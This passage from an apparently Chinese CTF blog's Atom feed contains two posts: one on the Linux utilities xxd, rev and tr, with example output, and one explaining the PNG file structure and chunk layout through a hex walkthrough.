    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxd -h</span><br><span class="line">xxd [options][infile[outfile]]</span><br><span class="line">xxd -r [options][infile[outfile]]</span><br></pre></td></tr></table></figure><ol><li><p><code>-b</code>:以2进制格式输出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -b train.ini</span></span><br><span class="line">0000000: 01011011 01110100 01110010 01100001 01101001 01101110  [train</span><br><span class="line">0000006: 01011101 00001101 00001010 01101110 01100111 01110010  ]..ngr</span><br><span class="line">000000c: 01100001 01101101 01100110 01101001 01101100 01100101  amfile</span><br></pre></td></tr></table></figure></li></ol><a id="more"></a><ol start="2"><li><p><code>-c</code>:每行输出多少个字节</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -c4 train.ini</span></span><br><span class="line">0000000: 5b74 7261  [tra</span><br><span class="line">0000004: 696e 5d0d  in].</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li><li><p><code>-g</code>:几个字节组成一组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -g4 train.ini</span></span><br><span class="line">0000000: 5b747261 696e5d0d 0a6e6772 616d6669  [train]..ngramfi</span><br><span class="line">0000010: 6c653d22 6e675f32 772e7478 74220d0a  le=&quot;ng_2w.txt&quot;..</span><br><span class="line">0000020: 69746572 636f756e 743d3430 30300d0a  itercount=4000..</span><br></pre></td></tr></table></figure></li><li><p><code>-i</code>:将文件内容输出成 c的一个数组格式</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -i train.ini</span></span><br><span class="line">unsigned char train_ini[] = &#123;</span><br><span class="line">0x5b, 0x74, 0x72, 0x61, 0x69, 0x6e, 0x5d, 0x0d, 0x0a, 0x6e, 0x67, 0x72,</span><br><span class="line">0x61, 0x6d, 0x66, 0x69, 0x6c, 0x65, 0x3d, 0x22, 0x6e, 0x67, 0x5f, 0x32,</span><br><span class="line"> &#125;;</span><br><span class="line"> unsigned int train_ini_len = 148;</span><br></pre></td></tr></table></figure></li><li><p><code>-l</code>:输出几个字节后结束</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -l12 train.ini</span></span><br><span class="line">0000000: 5b74 7261 696e 5d0d 0a6e 6772            [train]..ngr</span><br></pre></td></tr></table></figure></li><li><p><code>-p</code>：以一个整块输出所有的hex， 不使用空格进行分割</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -p train.ini</span></span><br><span class="line">5b747261696e5d0d0a6e6772616d66696c653d226e675f32772e74787422</span><br><span class="line">0d0a69746572636f756e743d343030300d0a73766d6761703d302e303030</span><br><span class="line">310d0a74656d706469723d2274656d70220d0a7664636c6973743d227664</span><br><span class="line">632e7478742220204f520d0a77686974656c6973743d2277686974652e6c</span><br><span class="line">697374220d0a626c61636b6c6973743d22626c61636b2e6c69737422</span><br></pre></td></tr></table></figure></li><li><p><code>-r</code>:反转操作，将16进制转为2进制</p></li><li><p><code>-s [+][-]seek</code>:从第几个字符开始</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -s5 train.ini</span></span><br><span class="line">0000005: 6e5d 0d0a 6e67 7261 6d66 696c 653d 226e  n]..ngramfile=&quot;n</span><br><span class="line">0000015: 675f 3277 2e74 7874 220d 0a69 7465 7263  g_2w.txt&quot;..iterc</span><br><span class="line">0000025: 6f75 6e74 3d34 3030 300d 0a73 766d 6761  ount=4000..svmga</span><br></pre></td></tr></table></figure></li><li><p><code>-u</code>:输出采用大写</p></li></ol><h1 id="rev"><a href="#rev" class="headerlink" title="rev"></a><strong>rev</strong></h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# cat iptables.bak</span><br><span class="line"><span class="meta">#</span><span class="bash"> Generated by iptables-save v1.3.5 on Thu Dec 26 21:25:15 2013</span></span><br><span class="line">*filter</span><br><span class="line">:INPUT DROP [48113:2690676]</span><br><span class="line">:FORWARD accept [0:0]</span><br><span class="line">:OUTPUT ACCEPT [3381959:1818595115]</span><br><span class="line">-A INPUT -i lo -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT</span><br><span class="line">-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">-A INPUT -p icmp -j ACCEPT</span><br><span class="line">-A OUTPUT -o lo -j ACCEPT</span><br><span class="line">COMMIT</span><br><span class="line"><span class="meta">#</span><span class="bash"> Completed on Thu Dec 26 21:25:15 2013</span></span><br><span class="line"></span><br><span class="line">[root@localhost ~]# rev iptables.bak    </span><br><span class="line">3102 51:52:12 62 ceD uhT no 5.3.1v evas-selbatpi yb detareneG #</span><br><span class="line">retlif*</span><br><span class="line">]6760962:31184[ PORD TUPNI:</span><br><span class="line">]0:0[ TPECCA DRAWROF:</span><br><span class="line">]5115958181:9591833[ TPECCA TUPTUO:</span><br><span class="line"> TPECCA j- ol i- TUPNI A-</span><br><span class="line"> TPECCA j- 22 tropd-- pct m- pct p- TUPNI A-</span><br><span class="line"> TPECCA j- 08 tropd-- pct m- pct p- TUPNI A-</span><br><span class="line"> TPECCA j- DEHSILBATSE,DETALER etats-- etats m- TUPNI A-</span><br><span class="line"> TPECCA j- pmci p- TUPNI A-</span><br><span class="line"> TPECCA j- ol o- TUPTUO A-</span><br><span class="line">TIMMOC</span><br><span class="line">3102 51:52:12 62 ceD uhT no detelpmoC #</span><br></pre></td></tr></table></figure><h1 id="tr"><a href="#tr" class="headerlink" title="tr"></a><strong>tr</strong></h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tr -c -d -s [&quot;string1_to_translate_from&quot;] [&quot;string2_to_translate_to&quot;] &lt; input-file</span><br></pre></td></tr></table></figure><p><code>-c</code> 用字符串1中字符集的补集替换此字符集，要求字符集为ASCII。<br><code>-d</code> 删除字符串1中所有输入字符。<br><code>-s</code> 删除所有重复出现字符序列，只保留第一个；即将重复出现字符串压缩为一个字符串。<br><code>input-file</code>是转换文件名。虽然可以使用其他格式输入，但这种格式最常用。</p><p><strong>字符范围</strong><br>    指定字符串1或字符串2的内容时，只能使用单字符或字符串范围或列表。<br>    <code>[a-z]</code> a-z内的字符组成的字符串。<br>    <code>[A-Z]</code> A-Z内的字符组成的字符串。<br>    <code>[0-9]</code> 数字串。<br>    <code>\octal</code> 一个三位的八进制数，对应有效的ASCII字符。<br>    <code>[O*n] </code>表示字符O重复出现指定次数n。因此<code>[O*2]</code>匹配<code>OO</code>的字符串。</p><p><strong>tr中特定控制字符的不同表达方式</strong><br>    速记符含义八进制方式<br>    <code>\a</code> Ctrl-G 铃声\007<br>    <code>\b</code> Ctrl-H 退格符\010<br>    <code>\f</code> Ctrl-L 走行换页\014<br>    <code>\n</code> Ctrl-J 新行\012<br>    <code>\r</code> Ctrl-M 回车\015<br>    <code>\t </code> Ctrl-I tab键\011<br>    <code>\v  </code> Ctrl-X \030</p>]]></content>
    
    
    <summary type="html">&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;xxd -h&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xxd [options][infile[outfile]]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xxd -r [options][infile[outfile]]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;-b&lt;/code&gt;:以2进制格式输出&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; xxd -b train.ini&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0000000: 01011011 01110100 01110010 01100001 01101001 01101110  [train&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0000006: 01011101 00001101 00001010 01101110 01100111 01110010  ]..ngr&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;000000c: 01100001 01101101 01100110 01101001 01101100 01100101  amfile&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;


&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="隐写" scheme="http://example.com/tags/%E9%9A%90%E5%86%99/"/>
    
    <category term="工具使用" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>PNG文件结构</title>
    <link href="http://example.com/2020/09/28/png%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
    <id>http://example.com/2020/09/28/png%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</id>
    <published>2020-09-28T06:00:24.745Z</published>
    <updated>2020-09-29T01:47:33.382Z</updated>
    
    <content type="html"><![CDATA[<p>根据PNG文件的定义来说，其文件头位置总是由位固定的字节来描述的：</p><table><thead><tr><th align="center">十进制数</th><th align="center">137 80 78 71 13 10 26 10</th></tr></thead><tbody><tr><td align="center">十六进制数</td><td align="center">89 50 4E 47 0D 0A 1A 0A</td></tr></tbody></table><p>其中第一个字节0x89超出了ASCII字符的范围，这是为了避免某些软件将PNG文件当做文本文件来处理。文件中剩余的部分由3个以上的PNG的数据块（Chunk）按照特定的顺序组成，因此，一个标准的PNG文件结构应该如下：</p><ul><li><p>PNG文件标志</p></li><li><p>PNG数据块 </p></li><li><p>……  </p></li><li><p>PNG数据块 </p></li></ul><a id="more"></a><hr><p><strong>PNG数据块（Chunk）</strong></p><p>PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了4个标准数据块，每个PNG文件都必须包含它们，PNG读写软件也都必须要支持这些数据块。虽然PNG文件规范没有要求PNG编译码器对可选数据块进行编码和译码，但规范提倡支持可选数据块。</p><p>下表就是PNG中数据块的类别，其中，关键数据块部分我们使用深色背景加以区分。</p><table><thead><tr><th><strong>PNG文件格式中的数据块</strong></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>数据块符号</strong></td><td><strong>数据块名称</strong></td><td><strong>多数据块</strong></td><td><strong>可选否</strong></td><td><strong>位置限制</strong></td></tr><tr><td>IHDR</td><td>文件头数据块</td><td>否</td><td>否</td><td>第一块</td></tr><tr><td>cHRM</td><td>基色和白色点数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>gAMA</td><td>图像γ数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>sBIT</td><td>样本有效位数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>PLTE</td><td>调色板数据块</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>bKGD</td><td>背景颜色数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr><tr><td>hIST</td><td>图像直方图数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr><tr><td>tRNS</td><td>图像透明数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr><tr><td>oFFs</td><td>(专用公共数据块)</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>pHYs</td><td>物理像素尺寸数据块</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>sCAL</td><td>(专用公共数据块)</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>IDAT</td><td>图像数据块</td><td>是</td><td>否</td><td>与其他IDAT连续</td></tr><tr><td>tIME</td><td>图像最后修改时间数据块</td><td>否</td><td>是</td><td>无限制</td></tr><tr><td>tEXt</td><td>文本信息数据块</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>zTXt</td><td>压缩文本数据块</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>fRAc</td><td>(专用公共数据块)</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>gIFg</td><td>(专用公共数据块)</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>gIFt</td><td>(专用公共数据块)</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>gIFx</td><td>(专用公共数据块)</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>IEND</td><td>图像结束数据</td><td>否</td><td>否</td><td>最后一个数据块</td></tr></tbody></table><p>为了简单起见，我们假设在我们使用的PNG文件中，这4个数据块按以上先后顺序进行存储，并且都只出现一次。</p><p><strong>数据块结构</strong></p><p>PNG文件中，每个数据块由4个部分组成，如下：</p><table><thead><tr><th><strong>名称</strong></th><th><strong>字节数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>Length (长度)</td><td>4字节</td><td>指定数据块中数据域的长度，其长度不超过(231－1)字节</td></tr><tr><td>Chunk Type Code (数据块类型码)</td><td>4字节</td><td>数据块类型码由ASCII字母(A-Z和a-z)组成</td></tr><tr><td>Chunk Data (数据块数据)</td><td>可变长度</td><td>存储按照Chunk Type Code指定的数据</td></tr><tr><td>CRC (循环冗余检测)</td><td>4字节</td><td>存储用来检测是否有错误的循环冗余码</td></tr></tbody></table><p>CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。CRC具体算法定义在ISO 3309和ITU-T V.42中，其值按下面的CRC码生成多项式进行计算：</p><p>x^32^+x^26^+x^23^+x^22^+x^16^+x^12^+x^11^+x^10^+x^8^+x^7^+x^5^+x^4^+x^2^+x+1</p><p>CRC: 一种校验算法。仅仅用来校验数据的正确性的</p><p>下面，我们依次来了解一下各个关键数据块的结构吧。</p><p><strong>IHDR</strong></p><p>文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p><p>文件头数据块由13字节组成，它的格式如下表所示。</p><table><thead><tr><th><strong>域的名称</strong></th><th><strong>字节数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>Width</td><td>4 bytes</td><td>图像宽度，以像素为单位</td></tr><tr><td>Height</td><td>4 bytes</td><td>图像高度，以像素为单位</td></tr><tr><td>Bit depth</td><td>1 byte</td><td>图像深度：   索引彩色图像：1，2，4或8   灰度图像：1，2，4，8或16   真彩色图像：8或16</td></tr><tr><td>ColorType</td><td>1 byte</td><td>颜色类型：  0：灰度图像, 1，2，4，8或16   2：真彩色图像，8或16   3：索引彩色图像，1，2，4或8   4：带α通道数据的灰度图像，8或16   6：带α通道数据的真彩色图像，8或16</td></tr><tr><td>Compression method</td><td>1 byte</td><td>压缩方法(LZ77派生算法)</td></tr><tr><td>Filter method</td><td>1 byte</td><td>滤波器方法</td></tr><tr><td>Interlace method</td><td>1 byte</td><td>隔行扫描方法：  0：非隔行扫描   1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法)</td></tr></tbody></table><p>由于本文很多设计到了PNG在手机方面的应用，因此在此提出MIDP1.0对所使用PNG图片的要求：</p><ul><li>在MIDP1.0中，只可以使用1.0版本的PNG图片。</li><li>文件大小：MIDP支持任意大小的PNG图片，然而实际上，如果一个图片过大，会由于内存耗尽而无法读取。</li><li>颜色类型：所有颜色类型都有被支持，虽然这些颜色的显示依赖于实际设备的显示能力。同时，MIDP也能支持alpha通道，但是，所有的alpha通道信息都会被忽略并且当作不透明的颜色对待。</li><li>色深：所有的色深都能被支持。</li><li>压缩方法：仅支持deflate压缩方式，这和jar文件的压缩方式完全相同，所以，PNG图片数据的解压和jar文件的解压可以使用相同的代码。</li><li>滤波器方法：在PNG中所有的5种方法都被支持。</li><li>隔行扫描：虽然MIDP支持0、1两种方式，然而，当使用隔行扫描时，MIDP却不会真正的使用隔行扫描方式来显示。</li><li>PLTE chunk：支持</li><li>IDAT chunk：图像信息必须使用5种过滤方式中的方式之一 (None, Sub, Up, Average, Paeth)</li><li>IEND chunk：当IEND数据块被找到时，这个PNG图像才认为是合法的PNG图像。</li><li>可选数据块：MIDP可以支持下列辅助数据块，然而，这却不是必须的。</li></ul><p>bKGD cHRM gAMA hIST iCCP iTXt pHYs<br> sBIT sPLT sRGB tEXt tIME tRNS zTXt</p><p><strong>PLTE</strong></p><p>调色板数据块PLTE(palette chunk)包含有与索引彩色图像(indexed-color image)相关的彩色变换数据，它仅与索引彩色图像有关，而且要放在图像数据块(image data chunk)之前。</p><p>PLTE数据块是定义图像的调色板信息，PLTE可以包含1~256个调色板信息，每一个调色板信息由3个字节组成：</p><table><thead><tr><th><strong>颜色</strong></th><th><strong>字节</strong></th><th><strong>意义</strong></th></tr></thead><tbody><tr><td>Red</td><td>1 byte</td><td>0 = 黑色, 255 = 红</td></tr><tr><td>Green</td><td>1 byte</td><td>0 = 黑色, 255 = 绿色</td></tr><tr><td>Blue</td><td>1 byte</td><td>0 = 黑色, 255 = 蓝色</td></tr></tbody></table><p>因此，调色板的长度应该是3的倍数，否则，这将是一个非法的调色板。</p><p>对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。</p><p>真彩色图像和带alpha通道数据的真彩色图像也可以有调色板数据块，目的是便于非真彩色显示程序用它来量化图像数据，从而显示该图像。</p><p><strong>IDAT</strong></p><p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p><p>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像。</p><p><strong>IEND</strong></p><p>图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p><p>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</p><p>00 00 00 00 49 45 4E 44 AE 42 60 82</p><p>不难明白，由于数据块结构的定义，IEND数据块的长度总是0（00 00 00 00，除非人为加入信息），数据标识总是IEND（49 45 4E 44），因此，CRC码也总是AE 42 60 82。</p><hr><p><strong>实例研究PNG</strong></p><p>以下是由Fireworks生成的一幅图像，图像大小为8*8，</p><p>为了方便观看，将图像放大：</p><p> 使用UltraEdit32打开该文件，如下：<br><strong>00000000~00000007：</strong></p><p>可以看到，选中的头8个字节即为PNG文件的标识。</p><p>接下来的地方就是IHDR数据块了：</p><p><strong>00000008~00000020：</strong></p><ul><li>00 00 00 0D 说明IHDR头块长为13</li><li>49 48 44 52 IHDR标识</li><li>00 00 00 08 图像的宽，8像素</li><li>00 00 00 08 图像的高，8像素</li><li>04 色深，2^4=16，即这是一个16色的图像（也有可能颜色数不超过16，当然，如果颜色数不超过8，用03表示更合适）</li><li>03 颜色类型，索引图像</li><li>00 PNG Spec规定此处总为0（非0值为将来使用更好的压缩方法预留），表示使压缩方法(LZ77派生算法)</li><li>00 同上</li><li>00 非隔行扫描</li><li>36 21 A3 B8 CRC校验</li></ul><p><strong>00000021~0000002F：</strong></p><p>可选数据块sBIT，颜色采样率，RGB都是256（2^8=256）</p><p><strong>00000030~00000062：</strong></p><p>这里是调色板信息</p><ul><li>00 00 00 27 说明调色板数据长为39字节，既13个颜色数</li><li>50 4C 54 45 PLTE标识</li><li>FF FF 00 颜色0</li><li>FF ED 00 颜色1</li><li>…… ……</li><li>09 00 B2 最后一个颜色，12</li><li>5F F5 BB DD CRC校验</li></ul><p><strong>00000063~000000C5：</strong></p><p>这部分包含了pHYs、tExt两种类型的数据块共3块，由于并不太重要，因此也不再详细描述了。</p><p><strong>000000C0~000000F8：</strong></p><p>以上选中部分是IDAT数据块</p><ul><li>00 00 00 27 数据长为39字节</li><li>49 44 41 54 IDAT标识</li><li>78 9C…… 压缩的数据，LZ77派生压缩方法</li><li>DA 12 06 A5 CRC校验</li></ul><p>IDAT中压缩数据部分在后面会有详细的介绍。</p><p><strong>000000F9~00000104：</strong></p><p>IEND数据块，这部分正如上所说，通常都应该是</p><p>00 00 00 00 49 45 4E 44 AE 42 60 82</p><p>至此，我们已经能够从一个PNG文件中识别出各个数据块了。由于PNG中规定除关键数据块外，其它的辅助数据块都为可选部分，因此，有了这个标准后，我们可以通过删除所有的辅助数据块来减少PNG文件的大小。（当然，需要注意的是，PNG格式可以保存图像中的层、文字等信息，一旦删除了这些辅助数据块后，图像将失去原来的可编辑性。）</p><p>删除了辅助数据块后的PNG文件，现在文件大小为147字节，原文件大小为261字节，文件大小减少后，并不影响图像的内容。</p><ul><li>如上说过，IDAT数据块是使用了LZ77压缩算法生成的，由于受限于手机处理器</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;根据PNG文件的定义来说，其文件头位置总是由位固定的字节来描述的：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;十进制数&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;137 80 78 71 13 10 26 10&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;十六进制数&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;89 50 4E 47 0D 0A 1A 0A&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;其中第一个字节0x89超出了ASCII字符的范围，这是为了避免某些软件将PNG文件当做文本文件来处理。文件中剩余的部分由3个以上的PNG的数据块（Chunk）按照特定的顺序组成，因此，一个标准的PNG文件结构应该如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;PNG文件标志&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;PNG数据块 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;……  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;PNG数据块 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="隐写" scheme="http://example.com/tags/%E9%9A%90%E5%86%99/"/>
    
    <category term="文件结构" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
</feed>
